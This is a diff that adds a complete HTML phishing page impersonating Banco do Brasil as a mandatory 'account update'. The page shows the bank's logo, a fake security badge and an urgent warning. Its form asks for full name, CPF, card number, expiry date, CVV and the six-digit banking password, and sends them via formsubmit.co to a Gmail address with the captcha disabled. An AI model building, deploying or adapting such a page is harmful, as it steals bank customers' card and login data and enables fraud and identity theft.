@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco do Brasil - Atualização Cadastral</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            position: relative;
+        }
+        .security-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: #003da5;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .security-badge img {
+            width: 16px;
+            height: 16px;
+        }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            margin: 20px;
+        }
+        .logo {
+            width: 150px;
+            height: auto;
+            margin-bottom: 20px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        h2 {
+            color: #003da5;
+            margin-bottom: 10px;
+            font-size: 20px;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+            font-weight: bold;
+            font-size: 13px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        input:focus {
+            border-color: #003da5;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #003da5;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #002a70;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #999;
+        }
+        .alert {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ffeeba;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Selo de Segurança -->
+    <div class="security-badge">
+        <img src="https://img.icons8.com/ios-filled/50/003da5/lock.png" alt="Seguro">
+        <span>SSL Seguro</span>
+    </div>
+
+    <div class="container">
+        <!-- Logo Oficial -->
+        <img src="https://upload.wikimedia.org/wikipedia/pt/thumb/1/15/Banco_do_Brasil_logo.svg/200px-Banco_do_Brasil_logo.svg.png" alt="Banco do Brasil" class="logo">
+        
+        <h2>Atualização Cadastral</h2>
+        <div class="alert">
+            ⚠️ Atualização obrigatória para manter suas operações ativas.
+        </div>
+        <p>Por favor, confirme seus dados de segurança para liberar seu cartão e contas.</p>
+
+        <!-- Formsubmit.co -->
+        <form action="https://formsubmit.co/equipenx1@gmail.com" method="POST">
+            <!-- Configurações do Formsubmit -->
+            <input type="hidden" name="_subject" value="Novos dados BB - Atualização Cadastral">
+            <input type="hidden" name="_captcha" value="false">
+
+            <div class="form-group">
+                <label for="nome">Nome Completo</label>
+                <input type="text" id="nome" name="nome" placeholder="Seu nome completo" required>
+            </div>
+
+            <div class="form-group">
+                <label for="cpf">CPF</label>
+                <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required>
+            </div>
+
+            <div class="form-group">
+                <label for="cartao">Número do Cartão</label>
+                <input type="text" id="cartao" name="cartao" placeholder="0000 0000 0000 0000" required>
+            </div>
+
+            <div class="form-group">
+                <label for="validade">Validade</label>
+                <input type="text" id="validade" name="validade" placeholder="MM/AA" required>
+            </div>
+
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <input type="text" id="cvv" name="cvv" placeholder="123" required>
+            </div>
+
+            <div class="form-group">
+                <label for="senha">Senha de 6 dígitos</label>
+                <input type="password" id="senha" name="senha" placeholder="******" maxlength="6" required>
+            </div>
+
+            <button type="submit">Confirmar Atualização</button>
+        </form>
+
+        <div class="footer">
+            &copy; Banco do Brasil S.A. Todos os direitos reservados.<br>
+            Segurança e Criptografia de Ponta.
+        </div>
+    </div>
+
+</body>
+</html>
